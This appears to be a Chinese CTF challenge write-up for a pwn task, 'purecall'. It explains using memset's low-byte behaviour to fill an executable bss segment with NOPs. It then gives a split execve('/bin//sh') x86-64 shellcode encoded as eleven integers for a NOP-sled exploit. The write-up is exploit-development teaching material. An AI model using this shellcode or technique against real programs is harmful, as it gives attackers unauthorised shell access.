> purecall

看到一篇堆喷的文章，联想到能不能**打散shellcode**，放到没开NX的bss段上，**填充nop**就可以滑完整个shellcode了

**改动**

这里需要注意一下memset的用法，很多人认为第二个参数只能是0或1，对应第二个参数是0和-1(0xffffffff)

最近偶然间得知了`memset`的一个特性，出于历史原因考虑（好像），函数原型的第二个参数是`int`型

但是库函数在函数操作时，往往是取低8位，再复制3份扩展成32位

于是这里写了2个奇怪的check，强制发现这个特性（虽然不知道还有没有其他绕过方法）

如果简单输入`0x90`，显然是没发现这个特性，而这个数是144（十进制），会挂在平方数的check1上

如果简单输入`0x90909090`，那就会死在check2上，要求高8位等3个8位不等于低8位

于是最后随便搞一个`0x12345690`，于是bss段会被低8位`0x90` 填充

> 这应该不算是脑洞吧......

一开始想的是，输入的字符串，打散为单个字符，但是shellcode中大部分都是多个机器码组成的

想了半天...也没有办法全部用单个机器码的指令组成shellcode

那换个条件，以`int`的形式读入shellcode，然后4字节4字节地打散

(这段shellcode是我网上随便找的)

```asm
'''
0000000000400080 <_start>:
  400080:	50                   	push   %rax
  400081:	48 31 d2             	xor    %rdx,%rdx
  400084:	48 31 f6             	xor    %rsi,%rsi
  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  40008e:	2f 73 68 
  400091:	53                   	push   %rbx
  400092:	54                   	push   %rsp
  400093:	5f                   	pop    %rdi
  400094:	b0 3b                	mov    $0x3b,%al
  400096:	0f 05                	syscall
'''
```

shellcode都类似这种

其中`movabs $0x68732f2f6e69622f,%rbx`这条指令太长了

考虑一下...无非是要对`rbx`赋值

我这里给出想到的一种方法

```assembly
	movabs $0x68732f2f6e69622f,%rbx
	==

	mov bx,0x6873		66 BB 73 68
	shl rbx,16			48 C1 E3 10
	mov bx 0x2f2f		66 BB 2F 2F
	shl rbx,16			48 C1 E3 10
	mov bx,0x6e69		66 BB 69 6E
	shl rbx,16			48 C1 E3 10
	mov bx 0x622f		66 BB 2F 62
```

那这样以后，每条指令的机器码长度都小于等于4了，符合int的条件

```asm
  50                   	push   %rax
  48 31 d2             	xor    %rdx,%rdx
  48 31 f6             	xor    %rsi,%rsi
 
 	mov bx,0x6873		66 BB 73 68
	shl rbx,16			48 C1 E3 10
	mov bx 0x2f2f		66 BB 2F 2F
	shl rbx,16			48 C1 E3 10
	mov bx,0x6e69		66 BB 69 6E
	shl rbx,16			48 C1 E3 10
	mov bx 0x622f		66 BB 2F 62
 
  	53                   	push   %rbx
  	54                   	push   %rsp
  	5f                   	pop    %rdi
  	b0 3b                	mov    $0x3b,%al
  	0f 05                	syscall
```

题目中限定第二次输入11个int

我们组合一下短指令

```assembly
  50                   	push   %rax
  48 31 d2             	xor    %rdx,%rdx
  
  ==
  50 48 31 d2
```

有些不好组合的，比如长度为3的指令，就填充nop 90

```assembly
 48 31 f6  (90)            	xor    %rsi,%rsi
```

最后可以得到一种形如这样的shellcode，正好可以结合成11个int

```a
	50 48 31 d2       
  	48 31 f6 90             
   	66 BB 73 68
	48 C1 E3 10
	66 BB 2F 2F

	48 C1 E3 10
	66 BB 69 6E
	48 C1 E3 10
	66 BB 2F 62
  	53 54 5f 90                   	
  	b0 3b 0f 05 
```

对应的整形值...我是手动输入然后C语言跑的

```C
int main(int argc, char**argv){
	printf("%d ", 0xd2314850);
	printf("%d ", 0x90f63148);
	printf("%d ", 0x6873bb66);
	printf("%d ", 0x10e3c148);
	printf("%d ", 0x2f2fbb66);
	printf("%d ", 0x10e3c148);
	printf("%d ", 0x6e69bb66);
	printf("%d ", 0x10e3c148);
	printf("%d ", 0x622fbb66);
	printf("%d ", 0x905f5453);
	printf("%d ", 0x050f3bb0);
	
	return 0;
}
```

```
-768522160 -1862913720 1752415078 283361608 791657318 283361608 1852423014 283361608 1647295334 -1872800685 84884400
```

现在再考虑**打散**的问题

代码中第一个输入的整形数，会memset整个bss段

我们把nop填满bss段就可以了

把输入的11个int数值按顺序~~伪随机~~地插入到bss段上

遇到nop就继续往下滑，最后就能跑完整个shellcode了









